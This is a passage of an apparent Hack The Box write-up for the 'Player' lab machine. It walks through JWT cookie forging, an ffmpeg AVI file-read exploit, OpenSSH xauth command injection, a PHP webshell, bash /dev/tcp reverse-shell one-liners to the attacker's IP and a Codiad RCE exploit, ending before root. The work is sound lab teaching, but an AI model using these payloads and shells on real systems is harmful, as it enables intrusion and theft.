+Author: Mazin Ahmed | &lt;mazin AT mazinahmed DOT net&gt; | @mazen160
+----------------------------------------------------------------------
+
+
+[i] URL: http://dev.player.htb
+[$] Discovered: -&gt; {http://dev.player.htb/.gitignore} (Response-Code: 200 | Content-Length: 173)
+[$] Discovered: -&gt; {http://dev.player.htb/.} (Response-Code: 200 | Content-Length: 5243)
+
+[i] Findings:
+http://dev.player.htb/.gitignore (200) | (Content-Length: 173)
+http://dev.player.htb/. (200) | (Content-Length: 5243)
+
+[i] Finished performing scan.
+</span></code></pre></div></div>
+<p>I can see the <code class="language-plaintext highlighter-rouge">.gitignore</code> file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>curl http://dev.player.htb/.gitignore
+<span class="go">*~
+*\#
+*.swp
+config.php
+data/
+workspace/
+plugins/*
+!plugins/README.md
+themes/*
+!themes/default/
+!themes/README.md
+.project
+.buildpath
+.settings/
+.svn/
+vendor/
+composer.lock
+</span></code></pre></div></div>
+<p>I’ll also run it over various files I found on the main site. When I run it over the php file for the mail submission, it finds something:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>bfac <span class="nt">--url</span> http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php
+<span class="go">----------------------------------------------------------------------
+                 _____ _____ _____ _____
+                | __  |   __|  _  |     |
+                | __ -|   __|     |   --|
+                |_____|__|  |__|__|_____|
+
+           -:::Backup File Artifacts Checker:::-
+                     Version: 1.4
+  Advanced Backup-File Artifacts Testing for Web-Applications
+Author: Mazin Ahmed | &lt;mazin AT mazinahmed DOT net&gt; | @mazen160
+----------------------------------------------------------------------
+
+
+[i] URL: http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php
+[$] Discovered: -&gt; {http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php~} (Response-Code: 200 | Content-Length: 742)
+
+[i] Findings:
+http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php~ (200) | (Content-Length: 742)
+
+[i] Finished performing scan.
+</span></code></pre></div></div>
+<p>If I go to that url, I get what must be the source for <code class="language-plaintext highlighter-rouge">dee8dc8a47256c64630d803a4c40786c.php</code>.</p>
+<h3 id="source-analysis">Source Analysis</h3>
+<p>I can look at the source now:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali# curl 'http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php~'
+<span class="cp">&lt;?php</span>
+<span class="k">require</span> <span class="s1">'vendor/autoload.php'</span><span class="p">;</span>
+
+<span class="kn">use</span> <span class="no">\Firebase\JWT\JWT</span><span class="p">;</span>
+
+<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">"access"</span><span class="p">]))</span>
+<span class="p">{</span>
+        <span class="nv">$key</span> <span class="o">=</span> <span class="s1">'_S0_R@nd0m_P@ss_'</span><span class="p">;</span>
+        <span class="nv">$decoded</span> <span class="o">=</span> <span class="no">JWT</span><span class="o">::</span><span class="nf">decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">"access"</span><span class="p">],</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nb">strtr</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="s1">'-_'</span><span class="p">,</span> <span class="s1">'+/'</span><span class="p">)),</span> <span class="p">[</span><span class="s1">'HS256'</span><span class="p">]);</span>
+        <span class="k">if</span><span class="p">(</span><span class="nv">$decoded</span><span class="o">-&gt;</span><span class="n">access_code</span> <span class="o">===</span> <span class="s2">"0E76658526655756207688271159624026011393"</span><span class="p">)</span>
+        <span class="p">{</span>
+                <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: 7F2xxxxxxxxxxxxx/"</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">else</span>
+        <span class="p">{</span>
+                <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: index.html"</span><span class="p">);</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">else</span>
+<span class="p">{</span>
+        <span class="nv">$token_payload</span> <span class="o">=</span> <span class="p">[</span>
+          <span class="s1">'project'</span> <span class="o">=&gt;</span> <span class="s1">'PlayBuff'</span><span class="p">,</span>
+          <span class="s1">'access_code'</span> <span class="o">=&gt;</span> <span class="s1">'C0B137FE2D792459F26FF763CCE44574A5B5AB03'</span>
+        <span class="p">];</span>
+        <span class="nv">$key</span> <span class="o">=</span> <span class="s1">'_S0_R@nd0m_P@ss_'</span><span class="p">;</span>
+        <span class="nv">$jwt</span> <span class="o">=</span> <span class="no">JWT</span><span class="o">::</span><span class="nf">encode</span><span class="p">(</span><span class="nv">$token_payload</span><span class="p">,</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nb">strtr</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="s1">'-_'</span><span class="p">,</span> <span class="s1">'+/'</span><span class="p">)),</span> <span class="s1">'HS256'</span><span class="p">);</span>
+        <span class="nv">$cookiename</span> <span class="o">=</span> <span class="s1">'access'</span><span class="p">;</span>
+        <span class="nb">setcookie</span><span class="p">(</span><span class="s1">'access'</span><span class="p">,</span><span class="nv">$jwt</span><span class="p">,</span> <span class="nb">time</span><span class="p">()</span> <span class="o">+</span> <span class="p">(</span><span class="mi">86400</span> <span class="o">*</span> <span class="mi">30</span><span class="p">),</span> <span class="s2">"/"</span><span class="p">);</span>
+        <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: index.html"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>The source is pretty simple. If the cookie <code class="language-plaintext highlighter-rouge">access</code> is present, it decodes it using the JWT module and the key <code class="language-plaintext highlighter-rouge">_S0_R@nd0m_P@ss_</code>. If the access code is <code class="language-plaintext highlighter-rouge">0E76658526655756207688271159624026011393</code>, it redirects to <code class="language-plaintext highlighter-rouge">7F2xxxxxxxxxxxxx/</code>. Otherwise, it redirects to <code class="language-plaintext highlighter-rouge">index.html</code>.</p>
+<p>If the cookie isn’t there, it creates the token using the welcome <code class="language-plaintext highlighter-rouge">access_code</code>, and sets it, redirecting to <code class="language-plaintext highlighter-rouge">index.html</code>.</p>
+<h3 id="forge-cookie">Forge Cookie</h3>
+<p>At first I tried to just visit <code class="language-plaintext highlighter-rouge">/7F2xxxxxxxxxxxxx/</code>, but the page doesn’t exist. I suspect the path is different in the running file. So it’s time to make my own JWT. I’ll go over to <a href="https://jwt.io/">jwt.io</a>. This site is a bit tricky to work with. If you just paste in the cookie, and then put in the key, it will update the cookie to be signed by that key. So I need to first put in the password and the original cookie, and make sure it stays that way and says valid. Once I have that, I’ll change the <code class="language-plaintext highlighter-rouge">access_code</code> and then copy the new cookie.</p>
+<p>With the key in place and “secret base64 encoded” checked, I can get back the original cookie (I have no idea why it needs to be marked as base64 when it is clearly not, but that works):</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1562602779419.webp" type="image/webp"/>
+<img alt="1562602779419" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1562602779419.png"/>
+</picture>
+<p>Now I can update the <code class="language-plaintext highlighter-rouge">access_code</code> to the one in the source, and I get a new cookie: <code class="language-plaintext highlighter-rouge">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IjBFNzY2NTg1MjY2NTU3NTYyMDc2ODgyNzExNTk2MjQwMjYwMTEzOTMifQ.VXuTKqw__J4YgcgtOdNDgsLgrFjhN1_WwspYNf_FjyE</code>.</p>
+<h3 id="access">Access</h3>
+<p>I’ll use my cookie manager to change out the cookie, and enter anything for “email”,  hit submit, and I ended up at <code class="language-plaintext highlighter-rouge">http://player.htb/launcher/7F2dcsSdZo6nj3SNMTQ1/</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1562602971976.webp" type="image/webp"/>
+<img alt="1562602971976" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1562602971976.png"/>
+</picture>
+<h2 id="usertxt">user.txt</h2>
+<h3 id="enumeration">Enumeration</h3>
+<p>The site is an upload site. When I upload something via the form, it is sent via HTTP POST to <code class="language-plaintext highlighter-rouge">/upload.php</code>. The response is a 200 with an HTTP header to redirect instantly which contains a token:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>refresh: 0;url=index.php/?token=1622989229
+</code></pre></div></div>
+<p>The token changes each time, and when a token is given, there’s a download link on the page:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1562615711507.webp" type="image/webp"/>
+<img alt="1562615711507" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1562615711507.png"/>
+</picture>
+<p>If I upload text files or images or anything else, the download link either 404s, or it returns a 0 byte file. I found a dummy mpg to upload, and it returned an avi: <code class="language-plaintext highlighter-rouge">http://player.htb/launcher/7F2dcsSdZo6nj3SNMTQ1/uploads/890756789.avi</code></p>
+<h3 id="ffmpeg-avi-exploit">ffmpeg AVI Exploit</h3>
+<p>Given that the page is creating <code class="language-plaintext highlighter-rouge">.avi</code> files from what I upload, some googling led me to <a href="https://www.blackhat.com/docs/us-16/materials/us-16-Ermishkin-Viral-Video-Exploiting-Ssrf-In-Video-Converters.pdf">this talk from Blackhat 2016</a>. <a href="https://hydrasky.com/network-security/exploiting-ssrf-in-video-converters/">This article</a> is a really good explanation of how the exploit works. The basics is that there’s a flaw in FFMEG that allows me to submit a malicious <code class="language-plaintext highlighter-rouge">.avi</code> file and get back a video of the text of the file.</p>
+<p>I found <a href="https://github.com/cujanovic/SSRF-Testing/blob/master/ffmpeg/gen_avi.py">this POC script</a> on Github. For example, I’ll grab the <code class="language-plaintext highlighter-rouge">/etc/lsb-release</code> file. First create the <code class="language-plaintext highlighter-rouge">.avi</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>python gen_avi.py file:///etc/lsb-release etc_lsb-release.avi
+</code></pre></div></div>
+<p>Now I’ll upload that <code class="language-plaintext highlighter-rouge">.avi</code>, and when I download the result, it is a video with the contents of <code class="language-plaintext highlighter-rouge">/etc/lsb-release</code> from Player:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200116214725682.webp" type="image/webp"/>
+<img alt="image-20200116214725682" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200116214725682.png"/>
+</picture>
+<h3 id="more-enumeration">More Enumeration</h3>
+<p>Thinking back to the error messages earlier on <code class="language-plaintext highlighter-rouge">staging</code>, I’ll try to grab those files:</p>
+<ul>
+<li><code class="language-plaintext highlighter-rouge">/var/www/backup/service_config</code></li>
+<li><code class="language-plaintext highlighter-rouge">/var/www/staging/fix.php</code></li>
+</ul>
+<p>I’m not able to get <code class="language-plaintext highlighter-rouge">fix.php</code>, but I do get <code class="language-plaintext highlighter-rouge">service_config</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1562654140484.webp" type="image/webp"/>
+<img alt="1562654140484" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1562654140484.png"/>
+</picture>
+<h3 id="ssh-lshell">SSH lshell</h3>
+<p>I’ll try those creds for SSH. Port 22 doesn’t do much, but I can use those creds on the second ssh port (6686), username <code class="language-plaintext highlighter-rouge">telegen</code>, password <code class="language-plaintext highlighter-rouge">d-bC|jC!2uepS/w</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>ssh <span class="nt">-p</span> 6686 telegen@10.10.10.145
+<span class="go">telegen@10.10.10.145's password: 
+Last login: Tue Apr 30 18:40:13 2019 from 192.168.0.104
+Environment:
+  USER=telegen
+  LOGNAME=telegen
+  HOME=/home/telegen
+  PATH=/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin
+  MAIL=/var/mail/telegen
+  SHELL=/usr/bin/lshell
+  SSH_CLIENT=10.10.14.8 43766 6686
+  SSH_CONNECTION=10.10.14.8 43766 10.10.10.145 6686
+  SSH_TTY=/dev/pts/0
+  TERM=screen
+========= PlayBuff ==========
+Welcome to Staging Environment
+
+</span><span class="gp">telegen:~$</span><span class="w">
+</span></code></pre></div></div>
+<p>However, I can run almost nothing:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">telegen:~$ </span><span class="nb">id</span>
+<span class="go">*** forbidden command: id
+</span><span class="gp">telegen:~$ </span><span class="nb">whoami</span>
+<span class="go">*** forbidden command: whoami
+</span><span class="gp">telegen:~$ </span><span class="nb">help</span>
+<span class="go">  clear  exit  help  history  lpath  lsudo
+</span><span class="gp">telegen:~$ </span>lpath
+<span class="go">Allowed:
+ /home/telegen
+</span><span class="gp">telegen:~$ </span>lsudo
+<span class="go">Allowed sudo commands:
+</span></code></pre></div></div>
+<h3 id="ssh-exploit">SSH Exploit</h3>
+<p>Back when I enumerated the ssh ports, there was a vulnerabity I didn’t understand the value of:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>OpenSSH 7.2p1 - (Authenticated) xauth Command Injection
+</code></pre></div></div>
+<p>Why would I need command injection when authenticated? Now I see.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>python 39569.py 10.10.10.145 6686 telegen <span class="s1">'d-bC|jC!2uepS/w'</span>
+<span class="go">INFO:__main__:connecting to: telegen:d-bC|jC!2uepS/w@10.10.10.145:6686
+INFO:__main__:connected!
+INFO:__main__:
+Available commands:
+    .info
+    .readfile &lt;path&gt;
+    .writefile &lt;path&gt; &lt;data&gt;
+    .exit .quit
+    &lt;any xauth command or type help&gt;
+
+</span><span class="gp">#&gt;</span><span class="w">
+</span></code></pre></div></div>
+<p>This exploit shell can do very little. It has some file write capability, but I didn’t have much luck with that. It can read files, but only up to the first whitespace on each line. Luckily for me, <code class="language-plaintext highlighter-rouge">user.txt</code> doesn’t have any whitespace :)</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#&gt;</span><span class="w"> </span>.readfile user.txt
+<span class="go">DEBUG:__main__:auth_cookie: 'xxxx\nsource user.txt\n'
+DEBUG:__main__:dummy exec returned: None
+INFO:__main__:30e47abe************************
+</span></code></pre></div></div>
+<h2 id="shell-as-www-data">Shell as www-data</h2>
+<h3 id="read-fixphp">Read fix.php</h3>
+<p>With the SSH exploit as telegen, I can now read parts of the other log file, <code class="language-plaintext highlighter-rouge">/var/www/staging/fix.php</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>python 39569.py 10.10.10.145 6686 telegen <span class="s1">'d-bC|jC!2uepS/w'</span>
+<span class="go">INFO:__main__:connecting to: telegen:d-bC|jC!2uepS/w@10.10.10.145:6686
+INFO:__main__:connected!
+INFO:__main__:
+Available commands:
+    .info
+    .readfile &lt;path&gt;
+    .writefile &lt;path&gt; &lt;data&gt;
+    .exit .quit
+    &lt;any xauth command or type help&gt;
+
+</span><span class="gp">#&gt;</span><span class="w"> </span>.readfile /var/www/staging/fix.php
+<span class="go">DEBUG:__main__:auth_cookie: 'xxxx\nsource /var/www/staging/fix.php\n'
+DEBUG:__main__:dummy exec returned: None
+INFO:__main__:&lt;?php
+class
+protected
+protected
+protected
+public
+return
+}
+public
+if($result
+static::passed($test_name);
+}
+static::failed($test_name);
+}
+}
+public
+if($result
+static::failed($test_name);
+}
+static::passed($test_name);
+}
+}
+public
+if(!$username){
+$username
+$password
+}
+//modified
+//for
+//fix
+//peter
+//CQXpm\z)G5D#%S$y=
+}
+public
+if($result
+static::passed($test_name);
+}
+static::failed($test_name);
+}
+}
+public
+echo
+echo
+echo
+}
+private
+echo
+static::$failed++;
+}
+private
+static::character(".");
+static::$passed++;
+}
+private
+echo
+static::$last_echoed
+}
+private
+if(static::$last_echoed
+echo
+static::$last_echoed
+}
+}
+</span></code></pre></div></div>
+<p>Because I only get up to the first whitespace on each line, it looks weird. But there’s a useful comment:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//modified</span>
+<span class="c1">//for</span>
+<span class="c1">//fix</span>
+<span class="c1">//peter</span>
+<span class="c1">//CQXpm\z)G5D#%S$y=</span>
+</code></pre></div></div>
+<p>The string <code class="language-plaintext highlighter-rouge">CQXpm\z)G5D#%S$y=</code> is interesting.</p>
+<p>It turns out those creds work for a codiad login on <code class="language-plaintext highlighter-rouge">dev.player.htb</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1562690003006.webp" type="image/webp"/>
+<img alt="1562690003006" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1562690003006.png"/>
+</picture>
+<h3 id="shell-through-codiad">Shell through Codiad</h3>
+<p>There are two ways to get a shell through Codiad that I’m aware of.</p>
+<h4 id="write-webshell">Write Webshell</h4>
+<p>When the page first loads after login, there’s a message that the path doesn’t exist:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200116221653659.webp" type="image/webp"/>
+<img alt="image-20200116221653659" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200116221653659.png"/>
+</picture>
+<p>I can add a new project by hitting the plus sigh in the Projects section:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200116221726805.webp" type="image/webp"/>
+<img alt="image-20200116221726805" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200116221726805.png"/>
+</picture>
+<p>I’m asked for a name and a path. I figured I’d like access to the entire file system, so I enter a name of Root and a path of <code class="language-plaintext highlighter-rouge">/</code>. On hitting Create Project, I get an error:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200116221839010.webp" type="image/webp"/>
+<img alt="image-20200116221839010" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200116221839010.png"/>
+</picture>
+<p>I’ll try <code class="language-plaintext highlighter-rouge">/var/www/demo</code> then, and it works. I can see what looks like the contents of the directory in the Explore window:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200116221942402.webp" type="image/webp"/>
+<img alt="image-20200116221942402" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200116221942402.png"/>
+</picture>
+<p>I’m not exactly sure what virtual host <code class="language-plaintext highlighter-rouge">/var/www/demo</code> corresponds to, but I’m guessing <code class="language-plaintext highlighter-rouge">dev</code>. To test, I’ll see if I can get <code class="language-plaintext highlighter-rouge">AUTHORS.txt</code> at http://dev.player.htb/AUTHORS.txt, and it works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>curl http://dev.player.htb/AUTHORS.txt
+<span class="go">Authors Ordered By First Contribution
+--------------------------------------------------
+
+Kent Safranski - @fluidbyte &lt;kent@fluidbyte.net&gt;
+Tim Holum - @tholum
+Gaurab Paul - @lorefnon
+Shawn A - @tablatronix
+Florent Galland - @Flolagale
+Luc Verdier - @Verdier
+Danny Morabito - @newsocialifecom &lt;staff@newsocialife.com&gt;
+Alexander D - @daeks
+Jean-Philippe Zolesio - @holblin
+
+and all the other contributors - Thanks!
+</span></code></pre></div></div>
+<p>Now I can just right click on <code class="language-plaintext highlighter-rouge">demo</code>, and select New File, and add a <code class="language-plaintext highlighter-rouge">cmd.php</code>. I’ll write my standard webshell:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"0xdf"</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>I’ll save the file, and then test it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>curl http://dev.player.htb/cmd.php?0xdf<span class="o">=</span><span class="nb">id</span>
+<span class="go">uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></code></pre></div></div>
+<p>To get a shell, I’ll visit <code class="language-plaintext highlighter-rouge">http://dev.player.htb/cmd.php?0xdf=bash -c 'bash -i &gt;%26 /dev/tcp/10.10.14.8/443 0&gt;%261'</code> with <code class="language-plaintext highlighter-rouge">nc</code> listening on 443:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.145.
+Ncat: Connection from 10.10.10.145:46678.
+bash: cannot set terminal process group (2206): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">www-data@player:/var/www/demo$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></code></pre></div></div>
+<h4 id="codiad-exploit">Codiad Exploit</h4>
+<p>There’s a public authenticated exploit to get a shell through codiad, and <a href="https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit">this repo</a> gives a nice POC. I’ll run the script and follow its instructions:</p>
+<p>Terminal 1:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>./codiad_exp.py http://dev.player.htb/ peter <span class="s1">'CQXpm\z)G5D#%S$y='</span> 10.10.14.8 443 linux
+<span class="go">[+] Please execute the following command on your vps: 
+echo 'bash -c "bash -i &gt;/dev/tcp/10.10.14.8/444 0&gt;&amp;1 2&gt;&amp;1"' | nc -lnvp 443
+nc -lnvp 444
+[+] Please confirm that you have done the two command above [y/n]
+[Y/n] Y
+[+] Starting...
+[+] Login Content : {"status":"success","data":{"username":"peter"}}
+[+] Login success!
+[+] Getting writeable path...
+[+] Path Content : {"status":"success","data":{"name":"PlayBuff","path":"playbuff"}}
+[+] Writeable Path : playbuff
+[+] Sending payload...
+</span></code></pre></div></div>
+<p>Terminal 2:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span><span class="nb">echo</span> <span class="s1">'bash -c "bash -i &gt;/dev/tcp/10.10.14.8/444 0&gt;&amp;1 2&gt;&amp;1"'</span> | nc <span class="nt">-lnvp</span> 443
+<span class="go">Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.145.
+Ncat: Connection from 10.10.10.145:42534.
+</span></code></pre></div></div>
+<p>Terminal 3:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>nc <span class="nt">-lnvp</span> 444
+<span class="go">Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::444
+Ncat: Listening on 0.0.0.0:444
+Ncat: Connection from 10.10.10.145.
+Ncat: Connection from 10.10.10.145:49500.
+bash: cannot set terminal process group (1178): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">www-data@player:/var/www/demo/components/filemanager$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></code></pre></div></div>
+<p><a href="https://0xdfimages.gitlab.io/img/player-shell.gif"><img alt="shell" src="https://0xdfimages.gitlab.io/img/player-shell.gif"/><em>Click for full size image</em></a></p>
+<h2 id="shell-as-telegen">Shell as telegen</h2>
+<p>I had creds for telegen and was able to connect over SSH, but couldn’t get anything to run. I can see in <code class="language-plaintext highlighter-rouge">/etc/passwd</code> that telegen’s shell is set to <code class="language-plaintext highlighter-rouge">lshell</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@player:/$</span><span class="w"> </span><span class="nb">grep </span>telegen /etc/passwd
+<span class="go">telegen:x:1000:1000:telegen,,,:/home/telegen:/usr/bin/lshell
+</span></code></pre></div></div>
+<p><a href="https://github.com/ghantoos/lshell">lshell</a> is a shell that allows the creator to limit what commands can be run.</p>
+<p>However, I can use <code class="language-plaintext highlighter-rouge">su</code> with the <code class="language-plaintext highlighter-rouge">-s</code> arg to specify the shell I want to run:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@player:/$</span><span class="w"> </span>su <span class="nt">-s</span> /bin/bash telegen
+<span class="go">Password: 
+</span><span class="gp">telegen@player:/$</span><span class="w">
+</span></code></pre></div></div>
+<p>Now I have a full <code class="language-plaintext highlighter-rouge">bash</code> shell. I can also grab <code class="language-plaintext highlighter-rouge">user.txt</code> if I hadn’t already before.</p>
+<h2 id="priv-www-data-or-telegen---root">Priv: www-data or telegen -&gt; root</h2>
+<h3 id="enumeration-1">Enumeration</h3>
+<p>After looking through the box, running LinEnum, etc, I pull <code class="language-plaintext highlighter-rouge">pspy</code> up to target and ran it. I noticed the following being run each minute as root:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">2019/07/09 12:54:01 CMD: UID=0    PID=6291   | CRON                 
+2019/07/09 12:54:01 CMD: UID=0    PID=6293   | /usr/bin/php /var/lib/playbuff/buff.php 
+2019/07/09 12:54:01 CMD: UID=0    PID=6292   | /bin/sh -c /usr/bin/php /var/lib/playbuff/buff.php &gt; /var/lib/playbuff/error.log 
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">buff.php</code> was owned by root:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@player:/dev/shm$ </span><span class="nb">ls</span> <span class="nt">-l</span> /var/lib/playbuff/buff.php                           
+<span class="go">-rwx---r-- 1 root root 878 Mar 24 17:19 /var/lib/playbuff/buff.php
+</span></code></pre></div></div>
+<p>It appears to be doing some kind of processing log update:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">include</span><span class="p">(</span><span class="s2">"/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php"</span><span class="p">);</span>
+<span class="kd">class</span> <span class="nc">playBuff</span>
+<span class="p">{</span>
+        <span class="k">public</span> <span class="nv">$logFile</span><span class="o">=</span><span class="s2">"/var/log/playbuff/logs.txt"</span><span class="p">;</span>
+        <span class="k">public</span> <span class="nv">$logData</span><span class="o">=</span><span class="s2">"Updated"</span><span class="p">;</span>
+
+        <span class="k">public</span> <span class="k">function</span> <span class="n">__wakeup</span><span class="p">()</span>
+        <span class="p">{</span>
+                <span class="nb">file_put_contents</span><span class="p">(</span><span class="k">__DIR__</span><span class="mf">.</span><span class="s2">"/"</span><span class="mf">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">logFile</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">logData</span><span class="p">);</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+<span class="nv">$buff</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">playBuff</span><span class="p">();</span>
+<span class="nv">$serialbuff</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$buff</span><span class="p">);</span>
+<span class="nv">$data</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"/var/lib/playbuff/merge.log"</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span>
+<span class="p">{</span>
+        <span class="nv">$update</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"/var/lib/playbuff/logs.txt"</span><span class="p">);</span>
+        <span class="nv">$query</span> <span class="o">=</span> <span class="nf">mysqli_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span> <span class="s2">"update stats set status='</span><span class="nv">$update</span><span class="s2">' where id=1"</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span>
+        <span class="p">{</span>
+                <span class="k">echo</span> <span class="s1">'Update Success with serialized logs!'</span><span class="p">;</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">else</span>
+<span class="p">{</span>
+        <span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">"/var/lib/playbuff/merge.log"</span><span class="p">,</span><span class="s2">"no issues yet"</span><span class="p">);</span>
+        <span class="nv">$update</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"/var/lib/playbuff/logs.txt"</span><span class="p">);</span>
+        <span class="nv">$query</span> <span class="o">=</span> <span class="nf">mysqli_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span> <span class="s2">"update stats set status='</span><span class="nv">$update</span><span class="s2">' where id=1"</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span>
+        <span class="p">{</span>
+                <span class="k">echo</span> <span class="s1">'Update Success!'</span><span class="p">;</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>Two things jump out as targets of exploitation:</p>
+<ul>
+<li>There is an include on <code class="language-plaintext highlighter-rouge">/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php</code>.</li>
+<li>The contents of <code class="language-plaintext highlighter-rouge">/var/lib/playbuff/merge.log</code> are deserialized.</li>
+</ul>
+<h3 id="shell-as-root">Shell as root</h3>
